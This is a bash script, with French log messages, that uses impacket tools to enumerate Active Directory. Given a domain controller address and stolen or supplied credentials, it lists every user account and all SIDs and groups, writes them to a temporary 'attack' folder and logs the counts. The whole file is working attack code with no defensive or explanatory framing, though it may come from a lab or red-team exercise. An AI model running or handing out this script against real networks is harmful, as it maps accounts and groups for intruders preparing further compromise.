#!/bin/bash
TARGET=$1
DOMAIN=$2
USER=$3
PASSWORD=$4
LOG_FILE="/tmp/netnova_ldap.log"

mkdir -p /tmp/netnova_attack

echo "[$(date '+%Y-%m-%d %H:%M:%S')] Énumération LDAP lancée sur $TARGET ($DOMAIN)" > $LOG_FILE
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Requêtes LDAP massives en cours..." >> $LOG_FILE

# Énumération des utilisateurs AD
impacket-GetADUsers "$DOMAIN/$USER:$PASSWORD" \
    -dc-ip "$TARGET" \
    -all 2>&1 | tee /tmp/netnova_attack/ldap_users.txt >> $LOG_FILE

# Énumération des SIDs et groupes
impacket-lookupsid "$DOMAIN/$USER:$PASSWORD@$TARGET" \
    2>&1 | tee /tmp/netnova_attack/ldap_groups.txt >> $LOG_FILE

USER_COUNT=$(wc -l < /tmp/netnova_attack/ldap_users.txt 2>/dev/null || echo 0)
GROUP_COUNT=$(grep -c "SidTypeGroup" /tmp/netnova_attack/ldap_groups.txt 2>/dev/null || echo 0)

echo "[$(date '+%Y-%m-%d %H:%M:%S')] $USER_COUNT utilisateurs trouvés" >> $LOG_FILE
echo "[$(date '+%Y-%m-%d %H:%M:%S')] $GROUP_COUNT groupes trouvés" >> $LOG_FILE
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Énumération LDAP terminée sur $TARGET" >> $LOG_FILE

cat $LOG_FILE